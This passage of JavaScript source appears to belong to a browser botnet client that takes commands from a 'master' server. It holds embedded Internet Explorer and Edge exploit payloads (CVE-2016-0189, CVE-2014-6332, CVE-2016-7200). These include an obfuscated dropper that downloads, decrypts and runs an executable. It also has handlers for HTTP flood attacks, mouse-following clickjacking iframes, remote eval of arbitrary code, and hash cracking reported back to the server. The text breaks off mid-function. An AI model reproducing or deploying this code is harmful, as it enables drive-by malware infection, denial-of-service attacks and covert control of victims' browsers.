,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,&h3f,&h6c,&h6b,&h6b,&h38,&h38,&h39,&h6a,&h71,&h6a,&h6f,&h6a,&h68,&h71,&h68,&h68,&h6d,&h65,&h71,&h3d,&h3f,&h38,&h6e,&h71,&h3e,&h64,&h69,&h6c,&h69,&h64,&h6d,&h3e,&h64,&h3a,&h6a,&h68,&h5c,&h3f,&h5c,&h31,&h5c,&h38,&h5c,&h72,&h5c,&h39,&h5c,&h24,&h5c,&h39,&h5c,&h7c,&h5c,&h73,&h5c,&h3f,&h5c,&h7c,&h5c,&h2f,&h5c,&h28,&h5c,&h3d,&h5c,&h2e,&h5c,&h28,&h5c,&h7c,&h5c,&h79,&h5c,&hf,&h5c,&h25,&h5c,&h2f,&h5c,&h1a,&h5c,&h35,&h5c,&h30,&h5c,&h39,&h5c,&h32,&h5c,&h3d,&h5c,&h31,&h5c,&h39,&h5c,&h79,&h5c,&h7c,&h5c,&h7a,&h5c,&h7c,&h5c,&h2e,&h5c,&h38,&h5c,&h7c,&h5c,&h73,&h5c,&h2f,&h5c,&h7c,&h5c,&h73,&h5c,&h2d,&h5c,&h7c,&h5c,&hf,&h5c,&h25,&h5c,&h2f,&h5c,&h28,&h5c,&h39,&h5c,&h31,&h5c,&h6f,&h5c,&h6e,&h5c,&h5c,&h5c,&hf,&h25,&h2f,&h28,&h39,&h31,&he,&h33,&h33,&h28,&h5c,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,&h58,&h30,0,0,0,0,0,0,0,0,0,0,&h3c,&h30,0,0,&h6c,&h30,0,0,&hd4,&h30,0,0,0,0,0,0,0,0,0,0,&h4a,&h30,0,0,&hdc,&h30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,&h4b,&h45,&h52,&h4e,&h45,&h4c,&h33,&h32,&h2e,&h44,&h4c,&h4c,0,0,&h41,&h44,&h56,&h41,&h50,&h49,&h33,&h32,&h2e,&h44,&h4c,&h4c,0,0,&h80,&h30,0,0,&h90,&h30,0,0,&ha8,&h30,0,0,&hb8,&h30,0,0,0,0,0,0,&h80,&h30,0,0,&h90,&h30,0,0,&ha8,&h30,0,0,&hb8,&h30,0,0,0,0,0,0,0,0,&h43,&h72,&h65,&h61,&h74,&h65,&h45,&h76,&h65,&h6e,&h74,&h41,0,0,0,0,&h47,&h65,&h74,&h57,&h69,&h6e,&h64,&h6f,&h77,&h73,&h44,&h69,&h72,&h65,&h63,&h74,&h6f,&h72,&h79,&h41,0,0,0,0,&h47,&h65,&h74,&h4c,&h61,&h73,&h74,&h45,&h72,&h72,&h6f,&h72,0,0,0,0,&h53,&h65,&h74,&h45,&h6e,&h76,&h69,&h72,&h6f,&h6e,&h6d,&h65,&h6e,&h74,&h56,&h61,&h72,&h69,&h61,&h62,&h6c,&h65,&h41,0,0,0,&he4,&h30,0,0,0,0,0,0,&he4,&h30,0,0,0,0,0,0,0,0,&h43,&h72,&h65,&h61,&h74,&h65,&h50,&h72,&h6f,&h63,&h65,&h73,&h73,&h41,&h73,&h55,&h73,&h65,&h72,&h57,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,&h10,0,0,&h28,0,0,0,&h15,&h30,&h1b,&h30,&h25,&h30,&h31,&h30,&h37,&h30,&h41,&h30,&h4b,&h30,&h59,&h30,&h5f,&h30,&h64,&h30,&h69,&h30,&h6f,&h30,&h74,&h30,&h79,&h30,&h8a,&h30,&h94,&h30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)\n' + '            For i=0 to Ubound(dllCode)\n' + '                dllCode(i) = Chr(dllCode(i))\n' + '            Next\n' + '            dlltxt = Join(dllcode,\"\")\n' + '            fakedll = c.BuildPath(fake32,\"shell32.dll\")\n' + '            Set b=c.CreateTextFile(fakedll)\n' + '            b.Write dlltxt\n' + '            b.Close\n' + '            f=c.BuildPath(tmp,rnds(8)&\".exe\")\n' + '            Set stream=CreateObject(\"ADODB.Stream\")\n' + '            stream.Open\n' + '            stream.Type=1\n' + '            stream.Write z\n' + '            arcnsave stream,key,f\n' + '            stream.Close\n' + '\n' + '            Set w=CreateObject(\"WScript.Shell\")\n' + '            w.CurrentDirectory=tmp\n' + '            oldroot=w.Environment(\"Process\").Item(\"SystemRoot\")\n' + '            w.Environment(\"Process\").Item(\"SystemRoot\")=tmp\n' + '            w.Environment(\"Process\").Item(\"SysFilename\")=f\n' + '            Set sh = CreateObject(\"Shell.Application\")\n' + '            Environment(\"Process\").Item(\"SystemRoot\")=oldroot\n' + '          End If\n' + '          Set ecompleted=CreateObject(\"WinHTTP.WinHTTPRequest.5.1\")\n' + '          ecompleted.SetProxy 0\n' + '          ecompleted.Open \"GET\",' +  master + "/exploit.php?connect=" + encodeURI(connectKey) + "&browsertype=" + encodeURI(browserType) + "&osname=" + encodeURI(OSName) + "&exploit=" + encodeURI("IE11 VBScript Memory Corruption") + ',0\n' + '          ecompleted.Option(0)=uas\n' + '          ecompleted.Send\n' + '        End Sub\n' + '\n' + '        Sub arcnsave(stream,strKey,fname)\n' + '          Dim kLen,x,y,i,j,t,slen,aBuf,bStream\n' + '          Dim s(256),k(256)\n' + '          klen=Len(strKey)\n' + '          For i=0 To 255\n' + '            s(i)=i\n' + '            k(i)=AscB(Mid(strKey, (i Mod klen)+1,1))\n' + '          Next\n' + '          j=0\n' + '          For i=0 To 255\n' + '            j=(j+k(i)+s(i)) And 255\n' + '            t=s(i):s(i)=s(j):s(j)=t\n' + '          Next\n' + '          slen=stream.position\n' + '          redim rc(slen)\n' + '          stream.position=0\n' + '          x=0:y=0\n' + '          For i=0 To slen-1\n' + '            x=(x+1) And 255\n' + '            y=(y+s(x)) And 255\n' + '            t=s(x):s(x)=s(y):s(y)=t\n' + '            rc(i)=Chr(CByte(s((s(x)+s(y)) And 255) Xor AscB(stream.Read(1))))\n' + '          Next\n' + '          Dim rctxt: rctxt = join(rc,\"\")\n' + '          Set c=CreateObject(\"Scripting.FileSystemObject\")\n' + '          Set b=c.CreateTextFile(fname)\n' + '          b.Write rctxt\n' + '          b.Close\n' + '        End Sub\n' + '\n' + '        Function SmuggleFag\n' + '            aw.ZeroineL()\n' + '            Dim i\n' + '            For i = 0 To k3\n' + '                y(i) = Mid(x, 1, k2*12)\n' + '            Next\n' + '        End Function\n' + '<\/script>\n' + '<script type=\"text/javascript\">\n' + '    function strToInt(s)\n' + '    {\n' + '        return s.charCodeAt(0) | (s.charCodeAt(1) << 16);\n' + '    }\n' + '    function intToStr(x)\n' + '    {\n' + '        return String.fromCharCode(x & 0xffff) + String.fromCharCode(x >> 16);\n' + '    }\n' + '    var o;\n' + '    o = {\"valueOf\": function () {\n' + '        SmuggleFag();\n' + '        Set req=CreateObject(\"WinHTTP.WinHTTPRequest.5.1\")\n' + '        req.SetProxy 0\n' + '        req.Open \"GET\",\"' + master + "/exploit.php?connect=" + encodeURI(connectKey) + "&browsertype=" + encodeURI(browserType) + "&osname=" + encodeURI(OSName) + "&exploit=" + encodeURI("IE11 Memory Corruption") + '\",0\n' + '        req.Option(0)=userAgent\n' + '        req.Send\n' + '        return 1;\n' + '    }};\n' + '    setTimeout(function() {ProtectMe(o);}, 64);\n' + '<\/script>\n';
                var IE11exploit = document.getElementsByTagName("body")[0].createElement("div");
                IE11exploit.innerHTML = cve_2016_0189;
                document.getElementsByTagName("body")[0].appendChild(IE11exploit);
                var cve_2014_6332 = '<script language=\"VBScript\">\n' + 'dim   gYpp0()\n' + 'dim   vti()\n' + 'dim   a0\n' + 'dim   a1\n' + 'dim   info\n' + 'dim   a2\n' + 'dim   a3\n' + 'dim   herrop\n' + 'Begin()\n' + 'Set req=CreateObject(\"WinHTTP.WinHTTPRequest.5.1\")\n' + 'req.SetProxy 0\n' + 'req.Open \"GET\",\"' + master + "/exploit.php?connect=" + encodeURI(connectKey) + "&browsertype=" + encodeURI(browserType) + "&osname=" + encodeURI(OSName) + "&exploit=" + encodeURI("IE8 Godmode") + '\",0\n' + 'req.Option(0)=userAgent\n' + 'req.Send\n' + 'function Begin()\n' + '  On Error Resume Next\n' + '  info=Navigator.UserAgent\n' + '  if(instr(info,\"Win64\")>0)   then\n' + '     exit   function\n' + '  end if\n' + '  BeginInit()\n' + '  If Create()=True Then\n' + '     wd=chrw(00)\n' + '     herrop=chrw(01)&chrw(2176)&chrw(01)&wd&wd&wd&wd&wd&wd&chrw(32767)&wd&wd\n' + '     werkty()\n' + '  end if\n' + 'end function\n' + '\n' + 'function BeginInit()\n' + '   Randomize()\n' + '   redim gYpp0(5)\n' + '   redim vti(5)\n' + '   a0=13+17*rnd(6)\n' + '   a3=7+3*rnd(5)\n' + 'end function\n' + '\n' + 'function Create()\n' + '  On Error Resume Next\n' + '  dim i\n' + '  Create=False\n' + '  For i = 0 To 400\n' + '    If RungeKutt()=True Then\n' + '       Create=True\n' + '       Exit For\n' + '    End If\n' + '  Next\n' + 'end function\n' + '\n' + 'sub rgweot()\n' + 'end sub\n' + '\n' + 'function eptaept()\n' + '     eptaept=12130\n' + 'end function\n' + '\n' + 'function dtemnr()\n' + '    On Error Resume Next\n' + '     i=rgweot\n' + '     i=null\n' + '     redim  Preserve gYpp0(a2)\n' + '     vti(0)=0\n' + '     gYpp0(a1)=i\n' + '     vti(0)=1.36598737437801E-314\n' + '     vti(0)=vti(0)+5E-314\n' + '     gYpp0(a1+2)=herrop\n' + '     vti(2)=9.74088534731324E-310\n' + '     vti(2)=vti(2)-8E-310\n' + '     dtemnr=gYpp0(a1)\n' + '     redim  Preserve gYpp0(a0)\n' + 'end function\n' + '\n' + 'Sub ColdAct()\n' + 'On Error Resume Next\n' + '          url=\"' + argv[1] + '\"\n' + 'Set a=crobbe(\"%53%63%72%69%70%74%69%6E%67%2E%46%69%6C%65%53%79%73%74%65%6D%4F%62%6A%65%63%74\")\n' + 'tmp=a.GetSpecialFolder(2)\n' + 'str=unescape(\"%66%75%6E%63%74%69%6F%6E%20%5F%6C%28%6C%29%7B%76%61%72%20%77%3D%22%70%6F%5C%78%37%37%22%2C%6A%3D%30%78%32%34%3B%72%65%74%75%72%6E%20%41%2E%72%6F%75%6E%64%28%28%41%5B%77%5D%28%6A%2C%6C%2B%31%29%2D%41%2E%72%61%6E%64%6F%6D%28%29%2A%41%5B%77%5D%28%6A%2C%6C%29%29%29%2E%74%6F%53%74%72%69%6E%67%28%6A%29%2E%73%6C%69%63%65%28%31%29%7D%3B%66%75%6E%63%74%69%6F%6E%20%56%28%6B%29%7B%76%61%72%20%79%3D%61%28%65%2B%22%2E%22%2B%65%2B%22%52%65%71%75%65%73%74%2E%35%2E%31%22%29%3B%79%2E%73%65%74%50%72%6F%78%79%28%6E%29%3B%79%2E%6F%70%65%6E%28%22%47%45%54%22%2C%6B%28%31%29%2C%31%29%3B%79%2E%4F%70%74%69%6F%6E%28%6E%29%3D%6B%28%32%29%3B%79%2E%73%65%6E%64%28%29%3B%79%2E%57%61%69%74%46%6F%72%52%65%73%70%6F%6E%73%65%28%29%3B%69%66%28%32%30%30%3D%3D%79%2E%73%74%61%74%75%73%29%72%65%74%75%72%6E%20%5F%28%79%2E%72%65%73%70%6F%6E%73%65%54%65%78%74%2C%6B%28%6E%29%29%7D%3B%66%75%6E%63%74%69%6F%6E%20%5F%28%6B%2C%65%29%7B%66%6F%72%28%76%61%72%20%6C%3D%30%2C%6E%2C%63%3D%5B%5D%2C%46%3D%32%35%35%2C%53%3D%53%74%72%69%6E%67%2C%71%3D%5B%5D%2C%62%3D%30%3B%32%35%36%3E%62%3B%62%2B%2B%29%63%5B%62%5D%3D%62%3B%66%6F%72%28%62%3D%30%3B%32%35%36%3E%62%3B%62%2B%2B%29%6C%3D%6C%2B%63%5B%62%5D%2B%65%2E%63%68%61%72%43%6F%64%65%41%74%28%62%25%65%2E%6C%65%6E%67%74%68%29%26%46%2C%6E%3D%63%5B%62%5D%2C%63%5B%62%5D%3D%63%5B%6C%5D%2C%63%5B%6C%5D%3D%6E%3B%66%6F%72%28%76%61%72%20%70%3D%6C%3D%62%3D%30%3B%70%3C%6B%2E%6C%65%6E%67%74%68%3B%70%2B%2B%29%62%3D%62%2B%31%26%46%2C%6C%3D%6C%2B%63%5B%62%5D%26%46%2C%6E%3D%63%5B%62%5D%2C%63%5B%62%5D%3D%63%5B%6C%5D%2C%63%5B%6C%5D%3D%6E%2C%71%2E%70%75%73%68%28%53%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%6B%2E%63%68%61%72%43%6F%64%65%41%74%28%70%29%5E%63%5B%63%5B%62%5D%2B%63%5B%6C%5D%26%46%5D%29%29%3B%72%65%74%75%72%6E%20%71%2E%6A%6F%69%6E%28%22%22%29%7D%3B%74%72%79%7B%76%61%72%20%75%3D%57%53%63%72%69%70%74%2C%6F%3D%22%4F%62%6A%65%63%74%22%2C%41%3D%4D%61%74%68%2C%53%3D%22%65%74%6F%22%2C%61%3D%46%75%6E%63%74%69%6F%6E%28%22%62%22%2C%22%72%65%74%75%72%6E%20%75%2E%43%72%65%61%74%65%22%2B%6F%2B%22%28%62%29%22%29%3B%50%3D%28%22%22%2B%75%29%2E%73%70%6C%69%74%28%22%20%22%29%5B%31%5D%2C%4D%3D%22%69%6E%64%65%78%4F%66%22%2C%71%3D%61%28%50%2B%22%69%6E%67%2E%46%69%6C%65%53%79%73%74%65%6D%22%2B%6F%29%2C%6D%3D%75%2E%41%72%67%75%6D%65%6E%74%73%2C%44%3D%22%6C%65%74%65%66%22%2C%65%3D%22%57%69%6E%48%54%54%50%22%2C%6A%3D%61%28%22%57%22%2B%50%2B%22%2E%53%68%65%6C%6C%22%29%2C%73%3D%61%28%22%5C%78%34%31%44%5C%78%34%66%5C%78%34%34%42%5C%78%32%65%5C%78%35%33%5C%78%37%34%5C%78%37%32%65%5C%78%36%31%5C%78%36%64%22%29%2C%78%3D%5F%6C%28%38%29%2B%22%2E%22%2C%70%3D%22%65%78%65%22%2C%6E%3D%30%2C%4B%3D%75%5B%50%2B%22%5C%78%34%36%5C%78%37%35%6C%6C%5C%78%34%65%5C%78%36%31%6D%65%22%5D%2C%45%3D%22%2E%22%2B%70%3B%44%3D%22%64%65%22%2B%44%3B%53%2B%3D%22%66%69%22%3B%6A%2E%43%75%72%72%65%6E%74%44%69%72%65%63%74%6F%72%79%3D%71%2E%47%65%74%53%70%65%63%69%61%6C%46%6F%6C%64%65%72%28%6E%2B%32%29%3B%73%2E%54%79%70%65%3D%32%3B%73%2E%43%68%61%72%73%65%74%3D%22%69%73%6F%2D%38%38%35%39%2D%31%22%3B%53%2B%3D%22%6C%65%22%3B%73%2E%4F%70%65%6E%28%29%3B%74%72%79%7B%76%3D%56%28%6D%29%7D%63%61%74%63%68%28%57%29%7B%75%2E%53%6C%65%65%70%28%39%39%39%39%29%3B%76%3D%56%28%6D%29%7D%3B%64%3D%76%2E%63%68%61%72%43%6F%64%65%41%74%28%30%32%37%2B%76%5B%4D%5D%28%22%5C%78%35%30%45%22%2B%22%5C%78%30%30%5C%78%30%30%22%29%29%3B%73%2E%57%72%69%74%65%54%65%78%74%28%76%29%3B%69%66%28%33%31%3C%64%29%7B%76%61%72%20%7A%3D%31%3B%78%2B%3D%22%5C%78%36%34%6C%5C%78%36%63%22%7D%65%6C%73%65%20%78%2B%3D%70%3B%53%3D%22%73%22%2B%22%61%76%22%2B%53%3B%73%5B%53%5D%28%78%2C%32%29%3B%73%2E%43%6C%6F%73%65%28%29%3B%7A%26%26%28%78%3D%22%72%65%67%73%76%72%22%2B%30%34%30%2B%45%2B%22%20%2F%73%20%22%2B%78%29%3B%6A%5B%22%5C%78%37%32%75%5C%78%36%65%22%5D%28%22%63%6D%64%22%2B%45%2B%22%20%2F%63%20%22%2B%78%2C%30%29%7D%63%61%74%63%68%28%5F%78%29%7B%7D%3B%44%2B%3D%22%69%6C%65%22%3B%71%5B%44%5D%28%4B%29%3B\")\n' + 'f=a.BuildPath(tmp,\"mxl3sfDs.tmp\")\n' + 'Set b=a.CreateTextFile(f)\n' + 'b.Write str\n' + 'b.Close\n' + 'If Not a.FileExists(f) Then\n' + '    exit sub\n' + 'End If\n' + 'Set pr=crobbe(\"%4D%53%54%53%57%65%62%50%72%6F%78%79%2E%4D%53%54%53%57%65%62%50%72%6F%78%79\")\n' + 'ws=unescape(\"%77%73%63%72%69%70%74%2E%65%78%65\")\n' + 'pr.StartRemoteDesktop ws, chr(47)&chr(47)&chr(66)&chr(32)&chr(47)&chr(47)&chr(69)&chr(58)&chr(74)&chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(32)&chr(34)&f&chr(34)&chr(32)&chr(34)&key&chr(34)&chr(32)&chr(34)&url&chr(34)&chr(32)&chr(34)&info&chr(34)\n' + 'End Sub\n' + '\n' + 'function werkty()\n' + '    On Error Resume Next\n' + '    i=dtemnr()\n' + '    i=giunls(i+8)\n' + '    i=giunls(i+16)\n' + '    j=giunls(i+&h134)\n' + '    for k=0 to &h60 step 4\n' + '        j=giunls(i+&h120+k)\n' + '        if(j=14) then\n' + '              j=0\n' + '              redim  Preserve gYpp0(a2)\n' + '              gYpp0(a1+2)(i+&h11c+k)=vti(4)\n' + '              redim  Preserve gYpp0(a0)\n' + '              j=0\n' + '              j=giunls(i+&h120+k)\n' + '              Exit for\n' + '        end if\n' + '    next\n' + '    vti(2)=4.69759663316747E-313\n' + '    vti(2)=vti(2)-3E-313\n' + '    ColdAct()\n' + 'end function\n' + '\n' + 'function RungeKutt()\n' + '    On Error Resume Next\n' + '    dim eptaone\n' + '    RungeKutt=False\n' + '    a0=a0+a3\n' + '    a1=a0+2\n' + '    a2=a0+&h8000000\n' + '    redim  Preserve gYpp0(a0)\n' + '    redim  vti(a0)\n' + '    redim  Preserve gYpp0(a2)\n' + '    eptaone=1\n' + '    vti(0)=1.123456789012345678901234567890\n' + '    gYpp0(a0)=10\n' + '    If(IsObject(gYpp0(a1-1)) = False) Then\n' + '       if(vartype(gYpp0(a1-1))<>0)  Then\n' + '          If(IsObject(gYpp0(a1)) = False) Then\n' + '              eptaone=VarType(gYpp0(a1))\n' + '          end if\n' + '       end if\n' + '    end if\n' + '    If(eptaone=eptaept()+4) Then\n' + '          RungeKutt=True\n' + '    End If\n' + '    redim  Preserve gYpp0(a0)\n' + 'end function\n' + '\n' + 'function crobbe(nam)\n' + '  Set crobbe=CreateObject(unescape(nam))  \n' + 'end function\n' + '\n' + 'function giunls(add)\n' + '    On Error Resume Next\n' + '    redim  Preserve gYpp0(a2)\n' + '    vti(0)=0\n' + '    gYpp0(a1)=add+4\n' + '    vti(0)=143.69759663316747E-313\n' + '    vti(0)=vti(0)-142E-313\n' + '    giunls=lenb(gYpp0(a1))\n' + '    vti(0)=0\n' + '    redim  Preserve gYpp0(a0)\n' + 'end function\n' + '<\/script>\n';
                var IE8exploit = document.getElementsByTagName("body")[0].createElement("div");
                IE8exploit.innerHTML = cve_2014_6332;
                document.getElementsByTagName("body")[0].appendChild(IE8exploit);
                exploitSent = true;
            } else if (isEdge && exploitSent == false) {
                //Edge exploit CVE-2016-7200
                sc = shellcode + argv[1]; + unescape("%u0000");
                (function(d, script) {
                    script = d.createElement('script');
                    script.type = 'text/javascript';
                    script.async = true;
                    script.onload = function(){
                        // remote script has loaded
                    };
                    script.src = master + "/meme.js";
                    d.getElementsByTagName('head')[0].appendChild(script);
                }(document));
                wait(5000).then(() => { // File should be downloaded by now
                    sc = shellcode + master + "/exploit.php?connect=" + encodeURI(connectKey) + "&browsertype=" + encodeURI(browserType) + "&osname=" + encodeURI(OSName) + "&exploit=EdgeChakra" + unescape("%u0000");
                    (function(d, script) {
                        script = d.createElement('script');
                        script.type = 'text/javascript';
                        script.async = true;
                        script.onload = function(){
                            // remote script has loaded
                        };
                        script.src = master + "/meme.js";
                        d.getElementsByTagName('head')[0].appendChild(script);
                    }(document));
                })
                exploitSent = true;
            } else if (isChrome && exploitSent == false) {
                //Chrome exploit goes here
                exploitSent = true;
            } else if (isBlink && exploitSent == false) {
                //Blink exploit goes here
                exploitSent = true;
            }

        } else if (command[i].substring(0, 4) == "post") {

            var argv = command[i].split("*");
            
            if(postSent == false) {
                post(argv[1], argv[2]);
                postSent = true;
            }
            
        } else if (command[i].substring(0, 9) == "floodpost") {

            var argv = command[i].split("*");

            setInterval(function() {
                post(argv[1], argv[2]);
            }, parseInt(argv[3])); //Initiate javascript POST load test

        } else if (command[i].substring(0, 4) == "load") {

            var argv = command[i].split("*");

            if (argv[1].indexOf("?") > -1) {
                var char = "&";
            } else {
                var char = "?";
            }

            setInterval(function() {
                imageLoad(argv[1] + char + Math.floor(Math.random() * 100000000) + "=SynthMesc");
            }, parseInt(argv[2])); //Initiate javascript load test

        } else if (command[i].substring(0, 8) == "antiddos") {

            var argv = command[i].split("*");

            if (argv[1].indexOf("?") > -1) {
                var char = "&";
            } else {
                var char = "?";
            }

            setInterval(function() {
                prepareFrame(argv[1] + char + Math.floor(Math.random() * 100000000) + "=SynthMesc");
            }, parseInt(argv[2])); //Initiate javascript load test


        } else if (command[i].substring(0, 6) == "layer4") { //Fucking powerful layer7 + layer4 hybrid attack
            
            var argv = command[i].split("*");
            
            var minSize = parseInt(argv[2].split("-")[0]);
            var maxSize = parseInt(argv[2].split("-")[1]) + 1;
            
            setInterval(function() {
                post(argv[1], makestr(randInt(minSize, maxSize), "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"));
            }, parseInt(argv[3])); //Initiate javascript POST load test
            
        } else if (command[i].substring(0, 4) == "jack") {

            var argv = command[i].split("*");
                        
            if(contains.call(sitesJacked, argv[1]) == false) {
                var css = '<style>iframe { position:absolute; filter:alpha(opacity=50); opacity:0.5; border: None left:0; top:0; }</style>';

                var frameName = "_" + Math.floor(Math.random() * 100); // div that is to follow the mouse (must be position:absolute)
                
                var iframe = '<iframe id="' + frameName + '" src="' + argv[1] + '" width="' + argv[2] + 'px" height="' + argv[3] + 'px" frameBorder="0"></iframe>';

                var div = document.createElement("div");
                div.innerHTML = css + iframe;

                document.getElementsByTagName("body")[0].appendChild(div);
                
                //Center iframe :3
                var offX = -(parseInt(argv[2])/2); // X offset from mouse position
                var offY = -(parseInt(argv[3])/2); // Y offset from mouse position

                function mouseX(evt) {
                    if (!evt) evt = window.event;
                    if (evt.pageX) return evt.pageX;
                    else if (evt.clientX) return evt.clientX + (document.documentElement.scrollLeft ? document.documentElement.scrollLeft : document.body.scrollLeft);
                    else return 0;
                }

                function mouseY(evt) {
                    if (!evt) evt = window.event;
                    if (evt.pageY) return evt.pageY;
                    else if (evt.clientY) return evt.clientY + (document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop);
                    else return 0;
                }

                function follow(evt) {
                    var obj = document.getElementById(frameName).style;
                    obj.left = (parseInt(mouseX(evt)) + offX) + 'px';
                    obj.top = (parseInt(mouseY(evt)) + offY) + 'px';
                }
                document.onmousemove = follow;
                sitesJacked.push(argv[1]);
            }

        } else if (command[i].substring(0, 4) == "eval") {

            var argv = command[i].split("*");
            
            if(contains.call(evaledCode, argv[1]) == false) {
                eval(argv[1]);
                evaledCode.push(argv[1]); // We have now evaled this code.
            }

        } else if (command[i].substring(0, 3) == "md5") {
            var argv = command[i].split("*");
            
            var minSize = parseInt(argv[2].split("-")[0]);
            var maxSize = parseInt(argv[2].split("-")[1]) + 1;
            var alpha = argv[3];
            
            if(contains.call(currentlyCracking, argv[1]) == false) {
                currentlyCracking.push(argv[1]); // We are now cracking this hash!
                var Crack = setInterval(function() {
                    var test = makestr(randInt(minSize, maxSize), alpha);
                    if (md5(test) == argv[1]) {
                        // We have cracked the hash!!! w00t!
                        xmlhttp.open("GET", master + "/hash.php?result=" + encodeURI("MD5 - " + test + ":" + argv[1]) + "&rand=" + rand, true);
                        xmlhttp.send(null); // Send the cracked hash to the server
                        clearInterval(Crack);
                    }
                }, 0);
            }
        
        } else if (command[i].substring(0, 4) == "sha1") {
            var argv = command[i].split("*");
            
            var minSize = parseInt(argv[2].split("-")[0]);
            var maxSize = parseInt(argv[2].split("-")[1]) + 1;
            var alpha = argv[3];
            
            if(isCrackingSHA1 == false && contains.call(currentlyCracking, argv[1]) == false) {
                isCrackingSHA1 = true;
                currentlyCracking.push(argv[1]); // We are now cracking this hash!
                var Crack = setInterval(function() {
                    var test = makestr(randInt(minSize, maxSize), alpha);
                    if (sha1(test) == argv[1]) {
                        // We have cracked the hash!!! w00t!
                        xmlhttp.open("GET", master + "/hash.php?result=" + encodeURI("MD5 - " + test + ":" + argv[1]) + "&rand=" + rand, true);
                        xmlhttp.send(null); // Send the cracked hash to the server
                        clearInterval(Crack);
